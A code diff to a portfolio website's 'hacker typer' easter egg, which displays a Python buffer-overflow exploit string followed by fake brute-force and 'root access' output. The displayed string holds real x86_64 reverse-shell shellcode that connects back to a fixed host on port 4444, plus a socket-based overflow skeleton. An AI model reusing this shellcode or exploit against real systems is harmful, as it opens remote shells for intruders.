@@ -19,7 +19,7 @@
     });
 
     // ==========================================
-    // 3. EASTER EGG: HOLLYWOOD HACKER TYPER
+    // 3. EASTER EGG: CINEMATIC HACK SEQUENCE
     // Trigger: User types 'hack' or 'pwned' in terminal
     // ==========================================
     const exploitCode = `#!/usr/bin/env python3
@@ -31,51 +31,96 @@ port = 4444
 offset = 1024
 ret_addr = struct.pack("<I", 0x080484b6)
 payload = b"A" * offset + ret_addr + b"\\x90" * 32 
-# Insert shellcode here
-shellcode = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
+
+# Constructing shellcode
+# This is a simple reverse shell execve("/bin/sh") shellcode for Linux x86_64 from https://www.exploit-db.com/shellcodes/42485 by Touhid Shaikh
+shellcode = b"\\x48\\x31\\xc0\\x48\\x83\\xc0\\x29\\x48\\x31\\xff\\x48\\x89\\xfa\\x48\\x83\\xc7\\x02\\x48\\x31\\xf6\\x48\\x83\\xc6\\x01\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xc0\\x50\\x48\\x83\\xc0\\x02\\xc7\\x44\\x24\\xfc\\xc0\\xa8\\x01\\x02\\x66\\xc7\\x44\\x24\\xfa\\x11\\x5c\\x66\\x89\\x44\\x24\\xf8\\x48\\x83\\xec\\x08\\x48\\x83\\xc0\\x28\\x48\\x89\\xe6\\x48\\x31\\xd2\\x48\\x83\\xc2\\x10\\x0f\\x05\\x48\\x31\\xc0\\x48\\x89\\xc6\\x48\\x83\\xc0\\x21\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x48\\x31\\xf6\\x48\\x83\\xc6\\x01\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x48\\x31\\xf6\\x48\\x83\\xc6\\x02\\x0f\\x05\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05"
 payload += shellcode
 
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((target_ip, port))
-    print(f"[+] Connected to {target_ip}:{port}")
-    s.send(payload)
-    print("[+] Payload delivered successfully. Awaiting reverse shell...")
-    time.sleep(2)
-    s.close()
-    print("[!] SYSTEM COMPROMISED. ROOT ACCESS GRANTED.")
-except Exception as e:
-    print(f"[-] Exploit failed: {e}")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target_ip, port))
+s.send(payload)
+print("[+] Payload delivered. Exploiting memory...")
 `;
 
     let isHacking = false;
-    let hackIndex = 0;
 
     function startHackerTyper() {
         isHacking = true;
-        document.body.innerHTML = `<div id="hacker-screen" class="p-8 text-green-500 font-mono text-sm h-screen w-screen bg-black overflow-hidden whitespace-pre-wrap"></div>`;
+        document.body.innerHTML = `
+            <div id="hacker-screen" class="p-4 md:p-8 text-green-500 font-mono text-xs md:text-sm h-screen w-screen bg-black overflow-x-hidden overflow-y-auto whitespace-pre-wrap"></div>
+            <div class="fixed top-2 right-4 text-gray-700 text-xs font-mono">PRESS [ESC] TO ABORT</div>
+        `;
         
+        // Listen for ESC to exit the hack screen
         window.addEventListener('keydown', (e) => {
-            if (!isHacking) return;
-            e.preventDefault(); // Stop scrolling
-            
-            // Exit condition: ESC key
-            if (e.key === 'Escape') {
-                location.reload(); // Reload to restore original portfolio
-            }
-
-            const screen = document.getElementById('hacker-screen');
-            // Add 5 characters per keystroke for that "fast typing" feel
-            screen.innerHTML += exploitCode.substring(hackIndex, hackIndex + 5);
-            hackIndex += 5;
-
-            // Loop the code if we reach the end
-            if (hackIndex >= exploitCode.length) {
-                hackIndex = 0;
-                screen.innerHTML += "\n\n";
-            }
-            window.scrollTo(0, document.body.scrollHeight);
+            if (e.key === 'Escape') location.reload();
         });
+
+        const screen = document.getElementById('hacker-screen');
+        let index = 0;
+
+        // Phase 1: Auto-Type the Code
+        function typeCode() {
+            if (!isHacking) return;
+            
+            // Type a random number of characters (3 to 6) to make it look like fast human typing
+            let chars = Math.floor(Math.random() * 4) + 3;
+            screen.innerHTML += exploitCode.substring(index, index + chars);
+            index += chars;
+            window.scrollTo(0, document.body.scrollHeight);
+
+            if (index < exploitCode.length) {
+                setTimeout(typeCode, 30); // Speed of typing
+            } else {
+                setTimeout(startExecution, 800); // Pause before executing
+            }
+        }
+
+        // Phase 2: Execute and Brute Force Memory
+        function startExecution() {
+            if (!isHacking) return;
+            screen.innerHTML += "\n\n<span class='text-yellow-400 font-bold'>[root@localhost]# python3 exploit.py</span>\n";
+            screen.innerHTML += "[*] Initiating buffer overflow sequence...\n";
+            screen.innerHTML += "[+] Connected to 192.168.1.100:4444\n";
+            screen.innerHTML += "[*] Spraying heap memory...\n";
+
+            let attempts = 0;
+            let maxAttempts = 35; // How many memory addresses to try before succeeding
+
+            let exploitInterval = setInterval(() => {
+                if (!isHacking) {
+                    clearInterval(exploitInterval);
+                    return;
+                }
+                
+                // Generate a fake random hex address (e.g., 0xb7e5f020)
+                let hexAddr = "0x" + Math.floor(Math.random() * 0xffffffff).toString(16).padStart(8, '0');
+                screen.innerHTML += `[*] Testing return address: ${hexAddr} ... <span class='text-red-500'>SEGFAULT</span>\n`;
+                window.scrollTo(0, document.body.scrollHeight);
+                attempts++;
+
+                // Phase 3: Success and Root Access
+                if (attempts >= maxAttempts) {
+                    clearInterval(exploitInterval);
+                    
+                    let successAddr = "0x" + Math.floor(Math.random() * 0xffffffff).toString(16).padStart(8, '0');
+                    screen.innerHTML += `[*] Testing return address: ${successAddr} ... <span class='text-green-400 font-bold'>SUCCESS</span>\n`;
+                    screen.innerHTML += `[*] Payload executed. Establishing reverse shell...\n\n`;
+
+                    setTimeout(() => {
+                        screen.innerHTML += `
+                            <div class='animate-pulse text-xl md:text-3xl font-bold text-red-500 mt-8 text-center border-4 border-red-500 p-6 w-full md:w-3/4 mx-auto bg-red-900/20 shadow-[0_0_50px_rgba(255,0,0,0.5)]'>
+                                [!] SYSTEM COMPROMISED.<br>ROOT ACCESS GRANTED.
+                            </div>`;
+                        window.scrollTo(0, document.body.scrollHeight);
+                    }, 1000);
+                }
+            }, 60); // Speed of the brute force loop (60ms)
+        }
+
+        // Start the sequence immediately after screen goes black
+        typeCode(); 
     }
 
     // ==========================================
